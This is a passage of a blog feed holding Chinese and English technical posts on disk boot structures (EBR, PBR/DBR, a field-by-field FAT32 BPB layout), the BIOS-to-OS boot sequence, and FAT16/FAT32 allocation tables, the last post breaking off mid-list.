id="ebr">EBR</h2><p>随着硬盘越来越大，四个主分区已经不够了，需要更多的分区。但是通过主引导记录MBR 定义的硬盘分区表只能描述 4个分区，因此出于拓展的需要，规定有且仅有一个区可以被定义成"扩展分区"（Extendedpartition）。</p><p>所谓"扩展分区"，就是指这个分区里面又分成多个分区。<strong>这种分区里面的分区，就叫做"逻辑分区"</strong>（logicalpartition）。</p><p>扩展分区的第一个扇区，叫做"扩展引导记录"（Extended bootrecord，缩写为 EBR）。它里面<strong>也包含一张 64字节的分区表</strong>，<strong>但是最多只有两项（也就是两个逻辑分区）</strong>。</p><p>那如果我们希望逻辑分区不止两个，怎么实现呢？我们往往采取类似于单链表的结构，其中四个主分区表项中的一个当做单链表的起始头，描述多余磁盘容量，即：扩展分区。该分区表项记录第一个逻辑分区的地址（第一个逻辑分区的EBR 的地址），而 EBR中两个分区表项：一项记录该逻辑分区(逻辑驱动器)的位置，另一项记录下一个逻辑分区的地址（第二个逻辑分区的EBR的地址），就这样一直链接下去，直到某个逻辑分区的分区表只包含它自身为止（即只有一个分区项）。因此，扩展分区可以包含无数个逻辑分区。</p><p>系统在启动时按照分区链的链接顺序查找分区。当然，若分区链成环，结果就是：系统无法引导，构成硬盘逻辑锁</p><p>关于 MBR， EBR 的逻辑结构：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422201415.png"alt="MBR&amp;EBR" /><figcaption aria-hidden="true">MBR&amp;EBR</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422212959.png"alt="EBR" /><figcaption aria-hidden="true">EBR</figcaption></figure><p>默认情况下， Windows系统一般只划分一个主分区给系统，剩余的部分全部划入扩展分区,也就是这样：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200821223428.png"alt="Windows partitions" /><figcaption aria-hidden="true">Windows partitions</figcaption></figure><p>这里有两点需要注意：</p><ol type="1"><li>在 MBR 分区表中最多 4 个主分区或者 3 个主分区＋ 1个扩展分区，也就是说扩展分区只能有一个，然后可以再细分为多个逻辑分区。</li><li>所有扩展分区开始位置的相对地址均从第 1 个扩展分区开始。</li><li>计算扩展分区的绝对地址需从加上 EBR1 的绝对地址（物理扇区号）。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422201756.png"alt="EBR Address" /><figcaption aria-hidden="true">EBR Address</figcaption></figure><h2 id="pbr">PBR</h2><blockquote><p>The partition boot record is the first block of any bootablepartition. It is also sometimes referred to as the Volume Boot Record(VBR)</p></blockquote><p>当然，卷与分区还是有区别的，参考 <ahref="https://www.zhihu.com/question/38843560">操作系统概念中，分区和卷的区别是什么？</a></p><p>分区引导记录(Partition Boot Record), 又称分区引导扇区（Partition BootSector)，卷引导扇区(Volume Boot Sector), 卷引导记录(VBR, Volume BootRecord), 它是由 FORMAT 高级格式化命令写在各个分区开始处第一个扇区。</p><p>当该分区为活动分区时，其 PBR 又称， DBR（DOS Boot Record，DOS引导记录）， OBR（OS Boot Record，操作系统引导记录）。除此之外，由于 DBR的内容与操作系统版本，文件系统有关，DBR 也可以被称之为 "Boot Sector文件系统名"，例如：“BOOT Sector FAT32”、“BOOT Sector NTFS”</p><p>当然，有时候也会直接将所有分区（无论活动与否）PBR 都叫做DBR，了解即可。</p><p>DBR 用来引导系统寻找激活分区根目录下的 NTLDR（XP）、bootmgr（Win7above）、grldr（Grub）、btldr.mbr（BootLink）等可用于引导操作系统的程序。每个分区都有引导扇区，但只有被设为活动分区的PBR 才能在引导过程中获得控制权，加载系统文件到内存。</p><ul><li>在对硬盘分区之后，每一个分区均有一个 DBR 与之对应。DBR位于每个分区的第一个扇区，大小为 512 字节。</li><li>DBR 内容根据操作系统版本不同，磁盘类型不同而有所变化</li><li>是可分区设备的每个分区内的第一个扇区。</li></ul><p>它可以有两个作用:</p><ol type="1"><li>当其为活动分区的 PBR, 即：DBR 时，具有加载系统文件，从而引导操作系统的作用。而非活动分区的对应部分的意义是存储DBR 的备份</li><li>作为任一个主分区的PBR，它负责管理某个具体的分区，存储着分区的相关信息。</li></ol><h3 id="dbr">DBR</h3><p>主引导程序执行完 MBR中的引导代码后，将系统控制权交给活动分区的引导记录DBR，用来引导操作系统。</p><ul><li>每个分区被赋予一个盘符，即逻辑盘符</li><li>每个分区逻辑扇区从“0”开始编号</li><li>高级格式化程序将引导记录 DBR 写到“0”扇区，DOS 引导扇区，</li></ul><h3 id="dbr-layout">DBR Layout</h3><p>操作系统引导记录 DBR（DOS Boot Record）通常位于硬盘的 1 柱面 0 磁道 1扇区，<strong>其逻辑扇区号为0</strong>，是操作系统可以直接访问的第一个扇区，因此，引导扇区又常常指DBR。</p><p>以 Windows FAT32 DBR 为例分析：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422225145.png"alt="FAT32 DBR" /><figcaption aria-hidden="true">FAT32 DBR</figcaption></figure><p>依次包括以下部分：</p><ol type="1"><li><p>跳转指令，让程序执行流程跳转到引导代码（3 个字节）</p><p>开头的跳转指令可以用来区分文件系统：</p><ol type="1"><li>FAT16 是 EB 3C 90</li><li>FAT32 是 E8 58 90</li><li>NTFS 是 EB 52 90</li></ol></li><li><p>厂商标识和系统版本号（03~0A）（也称为 OEM），8 个字节</p><p>其内容由创建该文件系统的 OEM 厂商具体安排。</p></li><li><p>磁盘参数块(0BH-59H 共占用 79 个字节)， 即: BPB，BIOS ParameterBlock</p><p>BPB 十分重要，由此可算出逻辑地址与物理地址。 <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422223052.png"alt="BPB" /></p><ol type="1"><li><p>0BH ～ 0CH：<strong>每扇区字节数</strong></p><p>每扇区字节数记录每个逻辑扇区的大小，其常见值为 512 字节，但 512字节并不是固定值。该值可以由程序定义，合法值包括 512、1024、2048 和 4096字节。</p></li><li><p>0DH：每簇扇区数</p><p>“簇”是 FAT12、FAT16 以及 FAT32文件系统下数据的最小存储单元，一个“簇”由一组连续的扇区组成。</p></li><li><p>0EH ～ 0FH：<strong>DBR 保留扇区数</strong></p><p>DBR 保留扇区数是指 DBR 本身占用的扇区以及其后保留扇区的总和，也就是DBR 到 FAT1 之间扇区总数，或者说是 FAT1 的开始扇区号（逻辑扇区号）。也称作 FAT表位置的偏移量，当然这里是相对于该分区的偏移量（没有包括该分区前面的部分）。<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423090210.png"alt="示例" /> 保留扇区数 = FAT1 起始扇区 - 引导扇区（DBR）起始扇区 =622020802-622020798 = 4</p></li><li><p>10H：<strong>FAT 表个数</strong> FAT 表个数描述了该文件系统有几个FAT 表，一般在 FAT 文件系统中都有两个 FAT，FAT1 和 FAT2。值默认为02</p></li><li><p>11H ～ 12H:未用</p><p>这个参数在 FAT16 中用来表示 FDT 中最大所能容纳的目录项数（RootEntries），一般为 0x0200=512，FAT32 没有固定的FDT，所以不用这个参数。</p></li><li><p>13H ～ 14H：扇区总数</p><p>这两个字节在 FAT16 中用来表示小于 32MB 的分区的扇区总数，FAT32的总是大于 32MB，所 以不用这个参数。</p></li><li><p>15H：磁介质描述符</p><p>介质描述符是描述磁盘介质的参数，根据磁盘性质的不同，取值不同。如<strong>硬盘为F8</strong>。</p></li><li><p>16H ～ 17H：未用</p><p>这两个字节在 FAT16 中用来表示每个 FAT 表包含的扇区数，FAT32未用。</p></li><li><p>18H ～ 19H：每磁道扇区数</p><p>这是逻辑 C/H/S 中的一个参数，其值一般为 63。</p></li><li><p>1AH ～ 1BH：磁头数</p></li><li><p>1CH ～ 1FH：<strong>隐藏扇区数</strong></p><p>隐藏扇区数是指本分区之前（相对）使用的扇区数，<strong>该值与分区表中所描述的该分区的起始扇区号一致</strong>。对于主磁盘分区来讲，是MBR 到该分区 DBR 之间的扇区数；对于扩展分区中的逻辑分区来讲，是其 EBR到该分区 DBR 之间的扇区数。</p><p>看不懂？ 接着看，下面有图。</p></li><li><p>20H ～ 23H：扇区总数</p><p>扇区总数是指分区的总扇区数，也就是 FAT32 分区的大小。</p></li><li><p>24H ～ 27H：每个 FAT 扇区数</p><p>这四个字节用来记录 FAT32 分区中每个 FAT 表占用的扇区数。</p></li><li><p>28H ～ 29H：标志</p><p>这两个字节用于表示 FAT32 是否可用，当其二进制最高位置 1 时，表示只有FAT1 可用，否则 FAT2 也可用。</p></li><li><p>2AH ～ 2BH：版本。通常为 0。</p></li><li><p>2CH ～ 2FH：<strong>根目录首簇号</strong></p><p>分区在格式化为 FAT32 文件系统时，格式化程序会在数据区中指派一个簇作为FAT32 的根目录区的开始，并把该簇号记录在 BPB中。<strong>通常是把数据区的第一个簇分配给根目录使用，也就是 2号簇。值固定为 02</strong></p></li><li><p>30H ～ 33H：文件系统信息扇区号。</p><p>FAT32 文件系统在 DBR的保留扇区中安排了一个文件系统信息扇区，用以记录数据区中空闲簇的数量及下一个空闲簇的簇号。该扇区一般在分区的1 号扇区，也就是紧跟在 DBR 后的一个扇区。</p></li><li><p>32H：DBR 备份扇区号</p><p>FAT32 文件系统在 DBR 的保留扇区中安排了一个 DBR 的备份，一般在 6号扇区，也就是分区的第 7 个扇区。该备份扇区与原 DBR扇区的内容完全一样，如果原 DBR 遭到破坏，可以用备份扇区修复。值默认为06</p></li><li><p>34H ～ 3FH:未用。这 12 个字节保留不用。</p></li><li><p>40H:BIOS 驱动器号</p><p>这是 BIOS 的 INT 13H 所描述的设备号码，一般从 80H 开始编号。</p></li><li><p>41H:未用。这两个字节不使用，为 0。</p></li><li><p>42H：扩展引导标记</p><p>扩展引导标记 用来确认后面的三个参数是否有效，一般值为 29H。</p></li><li><p>43H ～ 46H：卷列序号</p><p>卷列序号是格式化程序在创建文件系统时生成的一组 4字节的随机数值。</p></li><li><p>47H ～ 51H:卷标</p><p>卷标是由用户在创建文件系统时指定的一个卷的名称，原来的系统把卷标记录在这个地址处，现在的系统已经不再使用这个地址记录卷标，而是由一个目录项来管理卷标。</p></li><li><p>52H ～ 59H：<strong>文件系统类型</strong></p><p>BPB 最后一个参数，直接用 ASCⅡ 码记录当前分区的文件系统类型。一般FAT32 的标识均填写为：<code>46 41 54 33 32 20 20 20</code></p></li></ol></li><li><p>DOS 引导程序（5A~1FD）420 字节</p><p>其中 DOS 引导程序完成 DOS 系统文件（IO.SYS，MSDOS.SYS）的定位与装载<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423091124.png"alt="DOS 引导程序" /></p></li><li><p>结束标志 55AA</p></li></ol><p>对于采用 MBR 分区、FAT16 文件管理系统的硬盘而言，其大致结构如下:下图主要包含主引导记录和一个主分区的结构示例，其他分区的结构类似，不再展开。</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200825171743.png"alt="20200825171743" /><figcaption aria-hidden="true">20200825171743</figcaption></figure><p>关于 FAT 在这里先简单提一下，后面有博文进行详细介绍。</p><p>对使用 DOS 分区体系的磁盘进行数据恢复及取证时：</p><ol type="1"><li>基于 DOS 分区系统磁盘大都起始于 MBR 扇区。MBR 只占用 1个扇区，与文件系统分区间有 62 个空闲扇区</li><li>理论上 EBR只允许有两个分区表项，一个用于描述一个文件系统分区，另一个描述扩展分区。</li><li>主分区表被破坏时，可使用 Winhex识别各个分区。也可计算主分区各个表项值，直接填入主分区表。</li><li>不是所有系统对分区类型进行强制执行。比如将 FAT32 的类型值改为 Linux类型值，WinXP 依然可正常加载该分区。</li><li>Windows 对类型值为隐藏类型分区严格执行，不进行加载。但可通过 Linux加载。</li><li>有些版本只支持一个主文件系统分区表项。</li><li>分区表链被破坏时，可以通过“55AA”重新定位分区表链中各个分区表的位置。</li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="http://glennastory.net/boot/pbr.html">Partition Boot Record(PBR)</a></li><li><a href="https://en.wikipedia.org/wiki/Master_boot_record">Masterboot record</a></li><li><a href="https://en.wikipedia.org/wiki/Partition_type">Partitiontype</a></li><li><ahref="https://blog.csdn.net/ww1473345713/article/details/51602825">Linux引导扇区(boot sector)的结构</a></li><li><ahref="https://jaydenz.github.io/2018/05/05/4.Linux%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/">Linux系统启动流程</a></li><li><ahref="https://zh.wikipedia.org/wiki/%E4%B8%BB%E5%BC%95%E5%AF%BC%E8%AE%B0%E5%BD%95#%E4%B8%BB%E5%BC%95%E5%AF%BC%E6%89%87%E5%8C%BA%E7%9A%84%E8%AF%BB%E5%8F%96%E6%B5%81%E7%A8%8B">主引导记录</a></li><li><a href="https://www.dddps.com/pc/hardware/125.html">硬盘分区 FAT32文件系统 DBR 详解及手工重建</a></li><li><ahref="https://whatis.techtarget.com/definition/Master-Boot-Record-MBR">DefinitionMaster Boot Record (MBR)</a></li><li><a href="https://www.cnblogs.com/lsgxeva/p/11183693.html">BIOS 将MBR 读入 0x7C00 地址处(x86 平台下)</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Boot </tag>
            
            <tag> Computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Booting Process of Computer</title>
      <link href="/blog/2020/04/24/os/1.bootprocess/"/>
      <url>/blog/2020/04/24/os/1.bootprocess/</url>
      
        <content type="html"><![CDATA[<p>Booting (also known as booting up) is the initial set of operationsthat a computer system performs when electrical power is switched on.The process begins when a computer that has been turned off isre-energized, and ends when the computer is ready to perform its normaloperations. It typically involves performing power-on self-test,locating and initializing peripheral devices, and then finding, loadingand starting an operating system.</p><p>The computer term <strong>boot</strong> is short for bootstrap orbootstrap load and derives from the phrase to pull oneself up by one’sbootstraps. The usage calls attention to the paradox that a computercannot run without first loading software but some software must runbefore any software can be loaded.</p><h2 id="the-order-of-booting">The order of booting</h2><h2 id="bios">1. BIOS</h2><p>Early computers used a variety of ad-hoc methods to get a fragment ofsoftware into memory to solve this problem. The invention of integratedcircuit Read-only memory (ROM) of various types solved the paradox byallowing computers to be shipped with a start up program that could notbe erased, but growth in the size of ROM has allowed ever more elaboratestart up procedures to be implemented. Besides, the program in ROM iscall BIOS(Basic Input/Output System).</p><h3 id="post">1.1 POST</h3><h4 id="keypoint">KEYPOINT</h4><p>Once the computer’s power is first turned on, it will read BIOS(BasicInput/Output System) from ROM(read-only memory) which will test thecomputer to see if the fundamental conditions to boot itselt correctlyis met.</p><h4 id="elaboration">Elaboration</h4><p>In order for a computer to successfully boot, its <strong>BIOS,operating system and hardware</strong> components must all be workingproperly; failure of any one of these three elements will likely resultin a failed boot sequence.</p><p>When the computer’s power is first turned on, the CPU initializesitself, which is triggered by a series of clock ticks generated by thesystem clock. Part of the CPU’s initialization is to look to thesystem’s ROM BIOS for its first instruction in the startup program. TheROM BIOS stores the first instruction, which is the instruction to runthe <strong>power-on self test (POST)</strong>, in a predeterminedmemory address.</p><p>POST begins by checking the BIOS chip and then tests CMOS RAM. If thePOST does not detect a battery failure, it then continues to initializethe CPU, checking the inventoried hardware devices (such as the videocard), secondary storage devices, such as hard drives and floppy drives,ports and other hardware devices, such as the keyboard and mouse, toensure they are functioning properly.</p><p>Most BIOS chips use a system of beep codes to indicate the POSTstatus to the user and each BIOS chipset uses a different code.</p><h3 id="boot-sequence">1.2. Boot sequence</h3><p>Once the POST has determined that all components are functioningproperly and the CPU has successfully initialized, the BIOS looks for anOS to load.</p><p>The BIOS typically looks to the CMOS chip to tell it where to findthe OS, and in most PCs, the OS loads from the C drive on the hard driveeven though the BIOS has the capability to load the OS from a floppydisk, CD or ZIP drive.</p><p>The order of drives that the CMOS looks to in order to locate the OSis called the <strong>boot sequence</strong>, which can be changed byaltering the CMOS setup</p><p>This is what many people including me who installed Multisystem arefamiliar with.</p><p>Notice:</p><ul><li>Boot sequence governed by BIOS ROM</li><li>BIOS parameters stored in CMOS</li><li>BIOS ROM may be password protected</li></ul><h2 id="mbr">2. MBR</h2><p>BIOS 按照"启动顺序"，把控制权转交给排在第一位的储存设备。</p><p>这时，计算机读取该设备的第一个扇区，也就是读取最前面的 512个字节，即："主引导记录"（Master boot record，缩写为 MBR）。如果 MBR的最后两个字节是 0x55 和0xAA，表明这个设备可以用于启动；如果不是，表明设备不能用于启动，控制权于是被转交给"启动顺序"中的下一个设备。</p><p>关于主引导记录的详情，可以参照之前写的 <ahref="https://xuj.me/2020/04/24/infosec/backup_recovery/0.boot_sector/">BootSector 博文</a>，其中有 MBR 的内容</p><p>根据该博文对分区表中第一个字节的认识，我们知道它如果为0x80，就表示该主分区是激活分区，控制权要转交给这个分区。四个主分区里面只能有一个是激活的。</p><h2 id="硬盘启动">3. 硬盘启动</h2><p>这时，计算机的控制权就要从 MBR转交给硬盘的某个分区了，这里又分成三种情况。</p><p>3.1 情况 A：卷引导记录</p><p>上一节提到，四个主分区里面，只有一个是激活的。计算机会读取激活分区的第一个扇区，叫做"卷引导记录"（VolumeBoot Record，缩写为 VBR），也成为 “分区引导记录”（Partition BottRecord，缩写为 PBR）</p><p>"卷引导记录"的主要作用是，告诉计算机，操作系统在这个分区里的位置。然后，计算机就会加载操作系统了。</p><p>3.2 情况 B：扩展分区和逻辑分区</p><p>注：关于扩展分区的详细内容，也可以包含在之前写的 <ahref="https://xuj.me/2020/04/24/infosec/backup_recovery/0.boot_sector/">BootSector 博文</a>。</p><p>随着硬盘越来越大，四个主分区已经不够了，需要更多的分区。但是，分区表只有四项，因此规定有且仅有一个区可以被定义成"扩展分区"（Extendedpartition）。但是，似乎很少通过这种方式启动操作系统。如果操作系统确实安装在扩展分区，一般采用下一种方式启动。</p><p>3.3 情况 C：启动管理器</p><p>在这种情况下，计算机读取"主引导记录"前面 446字节的机器码之后，不再把控制权转交给某一个分区，而是运行事先安装的"启动管理器"（bootloader），由用户选择启动哪一个操作系统。</p><p>Linux 环境中，目前最流行的启动管理器是 grub。嗯，相信玩过 Linux的朋友对 grub已经不陌生了。如果有时间，自己再去详细了解一下它，并写篇博文笔记</p><h2 id="操作系统">4. 操作系统</h2><p>控制权转交给操作系统后，操作系统的内核首先被载入内存。</p><p>以 Linux 系统为例，先载入/boot 目录下面的kernel。内核加载成功后，第一个运行的程序是/sbin/init。它根据配置文件（Debian系统是/etc/initab）产生 init 进程。这是 Linux 启动后的第一个进程，pid进程编号为 1，其他进程都是它的后代。</p><p>然后，init线程加载系统的各个模块，比如窗口程序和网络程序，直至执行/bin/login程序，跳出登录界面，等待用户输入用户名和密码。</p><p>至此，全部启动过程完成。</p><h2 id="windows-7-操作系统引导过程">Windows 7 操作系统引导过程</h2><p>1、电脑开机后，开始启动 BIOS，开始 BIOS 自检。</p><p>2、通过自检后，bios 找到硬盘上的主引导记录 MBR.</p><p>3、MBR 开始读取硬盘分区表DPT，找到活动分区，找到活动分区中的分区引导记录 PBR，并且把控制权交给PBR.</p><p>4、PBR 搜索活动区中的启动管理器 bootmgr，找到后，PBR 把控制权交给bootmgr(相当于 xp 里的 ntldr 文件)。</p><p>5、Bootmgr 寻找活动分区中的 boot 文件夹中的 BCD文件（启动配置数据，相当于 xp 里的 boot.ini 文件）。</p><p>6、找到 BCD 后，Bootmgr 首先从 BCD 中读 SYS 取启动管理器 bootmgr菜单的语言版本信息，然后再调用 BOOTMGR 与相应语言的 BOOTMGR.EXE.MUI （在boot文件夹对应语言文件夹中）组成相应语言的启动菜单，之后在显示器上显示多操作系统选择画面。</p><p>7、如果存在多个操作系统而且系统设置的等待时间不是0，那么屏幕就显示多个操作系统的选择界面。如果没有多系统，那么直接进入windows 7 系统，不显示选择界面。</p><p>8、选择 windows 7 系统后，bootmgr 就会读取 BCD 里 win7系统所在的盘里的 windows.exe 文件，并且将控制权交给 winload.exe。</p><p>9、Winload.exe 加载 windows7内核、硬件、服务等，之后加载桌面等信息，从而启动整个 windows 7系统。</p><p>上面几步可以概括一下就是:</p><p>BIOS --&gt; MBR --&gt; DPT --&gt; PBR--&gt; Bootmgr --&gt; BCD--&gt;系统选择界面 ---&gt; 选择 windows7 ------&gt; Winload.exe ----&gt;内核加载等 --&gt; 启动整个 windows7 系统</p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="http://www.c-jump.com/CIS24/Slides/Booting/Booting.html">The BootProcess and Operating Systems</a></li><li><ahref="https://www.vskills.in/certification/tutorial/it-support/the-booting-process/">TheBooting Process</a></li><li><ahref="http://www.ruanyifeng.com/blog/2013/02/booting.html">计算机是如何启动的？</a></li><li><ahref="https://blog.csdn.net/lanxinju/article/details/5714124">主引导扇区（MBR），分区表（DPT）及活动分区(DBR)</a></li><li><ahref="https://www.jianshu.com/p/f11e6e5d5c81">操作系统引导过程</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Boot </tag>
            
            <tag> Computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FAT 文件系统</title>
      <link href="/blog/2020/04/24/os/2.fat/"/>
      <url>/blog/2020/04/24/os/2.fat/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>先了解一下，不同区域的相对位置以及其在磁盘上的大致位置。</p><p>不同区域的相对位置: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200417080522.png"alt="不同区域的相对位置" /></p><p>不同区域在磁盘上的大致位置: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200417080559.png"alt="从磁盘看不同区域" /></p><p>当然，上图讲的是 FAT16，其 FDT 独立于 DATA。 FAT32 是没有 FDT的，其根目录项存储在 DATA 区的前端。</p><h3 id="隐藏扇区">隐藏扇区</h3><p>隐藏扇区(hidden sector)是在分区之前的部分。通常所说的MBR，它是隐藏扇区的第一个扇区，也是整个存储介质的第一个物理扇区。</p><h3 id="保留扇区">保留扇区</h3><p>保留扇区(reserved sector) 是分区之内, FAT表之前的所有扇区。通常所说的DBR，就是保留扇区的第一个逻辑扇区。如果隐藏扇区为 0 个，那么 DBR所在的扇区就成为了第一个物理扇区，当然，这是不可能的。 注：保留扇区包含DBR，但不能认为其仅仅是 DBR。例如： 在 FAT32 的保留区中除了 DBR 还有个FSINFO 信息区，用来记录文件系统空闲簇的数量，下一可用簇的簇号。</p><h2 id="windows-文件系统">Windows 文件系统</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423111332.png"alt="20200423111332" /><figcaption aria-hidden="true">20200423111332</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423111341.png"alt="20200423111341" /><figcaption aria-hidden="true">20200423111341</figcaption></figure><p>FAT 16 的结构划分为:</p><div class="line-block">隐藏扇区 | （保留扇区 | FAT 区 | FDT | 数据区|）</div><p>分区前&lt;-|-&gt;分区之后，也就是文件系统的起始部分（后面这一部分是一个主分区，Windows上一般只有一个主分区，然后就是扩展分区了）</p><blockquote><p>注: FAT32 单个文件最大 4GB，也从一个方面体现出它已经跟不上时代的步伐了，当前 Windows一般都是使用 NTFS 了</p></blockquote><h2 id="fat">FAT</h2><p>FAT（File Allocation Table）文件系统是 Windows操作系统所使用的一种文件系统。</p><p>FAT 文件系统的发展经历了 FAT12、FAT16 和 FAT32 三个阶段。当然，目前Windows 主要使用更高级的 NTFS 了。</p><h2 id="fat-表">FAT 表</h2><p>FAT 表（FAT 文件分配表）可以看作是 DOS文件管理系统用来记录每个文件的存储位置的表格，FAT文件系统使用”簇“为数据单元，以链的方式存放簇号，所有簇从 2号开始编号（NTFS 的簇从 0 号开始）。每个簇在 FAT表中占有一个登记项，即：FAT 簇登记项。 又因为 FAT表的前两个登记项是特殊标记，所以从 2 号开始，簇编号对应登记项编号。</p><p>FAT表通过描述文件系统内的簇分配状态，说明文件系统内数据所分配的连续簇的顺序关系(即表明文件或目录的下一簇的序号)。</p><p>FAT表中没有指出哪个是文件的第一个簇，所以必须从目录中提取文件的首地址，然后通过FAT 来访问剩下的簇。所以，都是先去FDT(文件目录表)中获得文件的首簇号，然后到 FAT 表中确定文件的簇链。</p><p>分配给文件的簇的总字节数必须大于目录记录中文件大小区域指出的文件大小。除非文件的大小是簇的整数倍的话，否则最后一个簇的末尾就会有一部分未使用的空间。文件大小是0 的文件将不会分配簇，在目录记录中的簇数量应该为 0。</p><p>根据 FAT 表中每个登记项所占的位数将 FAT 划分为了 FAT12， FAT16，FAT32。</p><ol type="1"><li><p>FAT12</p><p>12 位表项值，可表示 4096 个簇 每簇 64 个扇区(32KB)，可表示 262144个扇区</p></li><li><p>FAT 16</p><p>16 位表项值，可表示 65 535 个簇 一般每簇不多于 64 个扇区(32KB)。最多管理 32x65535=2097120KB=2048MB=2GB 4 个分区，即管理 2x4=8GB</p></li><li><p>FAT32</p><p>32 位表项值，可表示 4294967296 个簇 若每个簇 4KB，理论可管理 4KBx4294967296 =16TB Windows 2000 以前，簇最大单位为 64 个扇区，之后为 128个扇区</p></li></ol><ul><li><strong>FAT文件系统中，重要的数据结构为文件分配表和目录项。</strong></li><li>FAT 在 DOS 引导扇区之后，有两个，基本表和备份。</li><li>每个 FAT 所占扇区数通过 BPB 偏移 16H 和 24H 处的值确定</li></ul><p>常规规则：</p><ul><li><p>数量：通常情况下一个 FAT 文件系统会有两个 FAT 表，但有时候也会允许只有一个 FAT 表， FAT 表的具体个数记录在引导扇区的 偏移0x10 字节处。</p></li><li><p>位置：因为 FAT 区位于文件系统的保留区之后，所以 FAT1在文件系统中的位置可以通过引导记录中偏移 0x0E~0x0F字节处的“保留扇区”数得到。</p></li><li><p>FAT2 紧跟在 FAT1 之后， 它的位置可以通过 FAT1 的位置加上每个 FAT表的大小扇区数获得。</p></li></ul><p>FAT 表中记录了每个文件的簇链结构；FAT表中记录的与数据区簇对应的表项，从 0号标记开始至当前数据区所分配的簇的最大数值，记录簇信息到 FAT项；但是注意：其中 0 号~1号簇的值都是操作系统预先不留设定的特殊标记，而数据区的起始簇是 2号簇。</p><h3 id="fat16">FAT16</h3><h4 id="fat16-结构">FAT16 结构</h4><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423124733.png"alt="20200423124733" /><figcaption aria-hidden="true">20200423124733</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423122329.png"alt="20200423122329" /><figcaption aria-hidden="true">20200423122329</figcaption></figure><h4 id="fat16-簇登记项">FAT16 簇登记项</h4><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423132150.png"alt="FAT16 登记项表" /><figcaption aria-hidden="true">FAT16 登记项表</figcaption></figure><p>不详细介绍。仅以实例来介绍簇链的概念。</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423134140.png"alt="FAT16 实例" /><figcaption aria-hidden="true">FAT16 实例</figcaption></figure><p>需要根据 “FAT16 登记项表” 一图中的 16 位表项值那一列来判断。 首先，0号和 1 号簇是特殊标记，我们不用管。从 2 号簇开始，</p><ol type="1"><li>2 号簇： 0xFFFF 表示文件结束，说明该文件只用了这一个簇。</li><li>3 号簇： 0x0004 表示已分配簇，其值为 4，表示该文件并未结束，下一簇是4 号簇</li><li>4 号簇 同上，说明还是上面一个文件的下一簇在 5 号簇</li><li>5 号簇 同上，同上，说明还是上面一个文件的下一簇在 6 号簇</li><li>6 号簇 0xFFFF，说明文件结束，表示从 3 号簇到 6号簇，一个文件的簇链结束。</li><li>7 号簇 0xFF 文件结束，代表该文件在本簇号就结束了。</li></ol><p>综上，有 3 个文件。</p><h3 id="fat32">FAT32</h3><h4 id="fat32-结构">FAT32 结构</h4><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200821214511.png"alt="FAT32" /><figcaption aria-hidden="true">FAT32</figcaption></figure><p>FAT32不使用固定的根目录区，根目录与其它子目录一样动态分配空间，其首簇号在 BPB中记录。</p><h4 id="fat32-登记项表">FAT32 登记项表</h4><p>FAT 表由一些列大小相等的表项组成。FAT32 中每个簇的状态，使用 32bit(4字节)记录在 FAT 表中。</p><p>FAT32 表中的所有字节位置以 4个字节为单位进行划分,并以所有划分后的位置由 0 进行地址编号。“0 号 和 1号” 地址被系统保留并存储特殊标识内容。</p><p>从 2 号地址开始，每个地址对应于数据区的簇号，FAT表中的簇登记项编号与数据区中的簇号相同。称 FAT中的这些四字节一组划分的项的地址为 FAT 表项， FAT 表项中记录的值为 FAT表项值。(簇编号与簇内内容关系 和 Map 中的键-值关系相同)</p><p>当文件系统创建时(就是格式化操作时)，分配给 FAT 区域的空间将会被清空，在 FAT1 与 FAT2 的 0 号和 1号表项写入特定值。由于创建文件系统的同时，也会创建根目录，也就是为根目录分配了一个簇空间，通常为2 号簇，所以 2 号簇所对应的 “2 号 FAT 表项” 也会被写入一个结束标记。</p><p><strong>FAT32 表格式说明</strong>:</p><ul><li><p>如果某个簇未被使用，他所对应的 FAT 表项内的 FAT 表项值即用 0进行填充，表示该 FAT 表项所对应的簇未被分配使用</p></li><li><p>当某个簇被分配使用时，那么他所对应的 FAT表项的值为文件的下一个存储文件的簇号。如果该文件结束于该簇，则在它的 FAT表项中记录的是一个文件结束标记，对于 FAT32 而言，<strong>代表文件结束的FAT 表项值为 0x0FFFFFFF</strong>。</p></li><li><p>如果某个簇存在坏扇区，则整个簇会用 FAT 表项值 0x0FFFFFF7标记为坏簇， 不再使用，这个坏簇标记就记录在它所对应的 FAT表项中。</p></li><li><p>由于簇号起始于 2， 所以 FAT 表的 0 号表项与 1号表项不予任何簇对应。FAT32 的 0 号表项值总是 “F8FFFF0F”</p></li></ul><p>注意： 可以搜索扇区偏移 0 字节处的该值(F8FFF0F)以查找 FAT 表。</p><ul><li>1 